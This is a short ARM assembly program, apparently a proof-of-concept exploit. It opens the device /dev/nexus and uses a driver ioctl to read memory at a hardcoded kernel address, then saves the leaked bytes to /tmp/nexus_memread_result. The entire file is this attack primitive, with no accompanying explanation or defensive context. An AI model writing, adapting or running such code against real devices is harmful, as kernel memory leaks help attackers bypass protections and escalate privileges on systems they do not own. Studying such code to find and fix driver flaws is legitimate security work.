.syntax unified
.arm
.global _start
.type _start, %function
_start:
    sub sp, sp, #16

    adr r0, device
    mov r1, #2
    mov r2, #0
    mov r7, #5
    svc #0
    mov r4, r0

    ldr r0, target_address
    str r0, [sp, #0]
    add r1, sp, #12
    str r1, [sp, #4]
    mov r0, r4
    ldr r1, read_ioctl
    mov r2, sp
    mov r7, #54
    svc #0
    str r0, [sp, #8]

    adr r0, result_path
    ldr r1, open_flags
    mov r2, #192
    mov r7, #5
    svc #0
    mov r5, r0

    mov r0, r5
    mov r1, sp
    mov r2, #12
    mov r7, #4
    svc #0

    mov r0, #0
    mov r7, #1
    svc #0

.align 2
target_address: .word 0xbf569640
read_ioctl:     .word 0x00650025
open_flags:     .word 0x00000241
device:         .asciz "/dev/nexus"
result_path:    .asciz "/tmp/nexus_memread_result"
